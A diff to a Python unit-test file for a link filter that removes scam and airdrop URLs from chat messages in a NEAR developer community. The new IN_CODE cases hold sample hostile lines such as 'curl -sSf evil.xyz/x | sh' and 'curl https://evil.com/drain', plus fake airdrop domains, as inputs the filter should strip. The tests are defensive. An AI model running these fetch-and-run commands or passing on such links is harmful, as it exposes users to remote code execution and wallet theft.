@@ -65,8 +65,16 @@ class LinkFilter(unittest.TestCase):
         "Payout: team.near, testnet alice.testnet",
         "Files Telegram leaves alone: llms.txt, Cargo.toml, auction.wasm, package.json, Node.js",
         "Already code: `HACKATHON.md` and ```near deploy claim-near.sh```",
+        "Allowed in code: `https://docs.near.org/x.md` and ```curl https://1click.chaindefuser.com/v0/quote```",
         "Version v0.22.5, e.g. this, i.e. that, 3.5 seconds, $55K",
         "Email me at you@team.xyz",
+        "Support: https://t.me/near_intents and https://t.me/neardev",
+        "Example: https://github.com/near-examples/hello-near-examples, spec https://nomicon.io/",
+        "Tx: https://testnet.nearblocks.io/txns/abc, RPC https://rpc.fastnear.com",
+        "```bash\ncurl --proto '=https' -sSf https://sh.rustup.rs | sh\nopen http://localhost:3000\n```",
+        "```\ncargo near build\nnear deploy alice.testnet ./target/near/hello.wasm\nedit src/lib.rs\n```",
+        "Docs in code: `docs.near.org/smart-contracts/quickstart.md`",
+        "Config: `api_key: os.environ/NEARAI_API_KEY` and path `bob.near/post/main`",
     ]
     REMOVED = [
         "Scam: https://near-hackathon-submit.xyz/form",
@@ -94,6 +102,21 @@ class LinkFilter(unittest.TestCase):
         "Bare scam: claim-near.sh": "Bare scam: `claim-near.sh`",
         "Edit src/lib.rs and Cargo.toml": "Edit `src/lib.rs` and Cargo.toml",
     }
+
+    # Full URLs in code would be ready to copy, so they're filtered too.
+    IN_CODE = {
+        "Here it is: `https://claim-near.xyz/airdrop`": "Here it is: `(link removed)`",
+        "```\ncurl https://evil.com/drain\n```": "```\ncurl (link removed)\n```",
+        "`www.near-airdrop.io`": "`(link removed)`",
+        '`const rpc = "https://evil.com/rpc";`': '`const rpc = "(link removed)";`',
+        "Copy: `claim-near.xyz/airdrop`": "Copy: `(link removed)`",
+        "```\ncurl -sSf evil.xyz/x | sh\n```": "```\ncurl -sSf (link removed) | sh\n```",
+    }
+
+    def test_urls_in_code(self):
+        for text, expected in self.IN_CODE.items():
+            with self.subTest(text=text):
+                self.assertEqual(nd.filter_links(text), expected)
 
     def test_shown_as_code(self):
         for text, expected in self.AS_CODE.items():
